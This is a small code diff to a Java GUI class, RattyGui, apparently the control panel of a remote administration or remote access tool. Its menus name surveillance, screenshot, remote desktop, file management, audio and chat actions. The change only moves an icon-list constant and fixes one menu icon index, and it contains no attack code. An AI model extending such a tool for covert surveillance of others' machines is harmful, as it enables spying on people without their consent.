@@ -66,6 +66,7 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> im
 	private static final BufferedImage FILE_MANAGEMENT_ICON = CATEGORY_SHEET.getSprite(1);
 	private static final BufferedImage UTILITY_ICON = CATEGORY_SHEET.getSprite(2);
 	private static final BufferedImage OTHER_ICON = CATEGORY_SHEET.getSprite(3);
+	private static final List<BufferedImage> GUI_ICONS = Arrays.asList(GUI_ICON_SMALL, GUI_ICON_MEDIUM, GUI_ICON_LARGE);
 	
 	private static final String SURVEILLANCE = LANGUAGE.getString("menu.surveillance");
 	private static final String FILE_MANAGEMENT = LANGUAGE.getString("menu.file_management");
@@ -93,8 +94,6 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> im
 	public static final String CHAT = LANGUAGE.getString("action.chat");
 	public static final String CLOSE = "Close";
 	
-	public static final List<BufferedImage> GUI_ICONS = Arrays.asList(GUI_ICON_SMALL, GUI_ICON_MEDIUM, GUI_ICON_LARGE);
-	
 	static {
 		SURVEILLANCE_ITEM_DATA.put(SCREENSHOT, MENU_ICONS[1]);
 		SURVEILLANCE_ITEM_DATA.put(DESKTOP, MENU_ICONS[2]);
@@ -108,7 +107,7 @@ public final class RattyGui extends AbstractListenerContainer<IGuiController> im
 		UTILITY_ITEM_DATA.put(WEBSITE, MENU_ICONS[8]);
 		UTILITY_ITEM_DATA.put(AUDIO, MENU_ICONS[7]);
 		UTILITY_ITEM_DATA.put(CHAT, MENU_ICONS[12]);
-		OTHER_ITEM_DATA.put(FREE, MENU_ICONS[11]);
+		OTHER_ITEM_DATA.put(FREE, MENU_ICONS[10]);
 	}
 	
 	public RattyGui() {
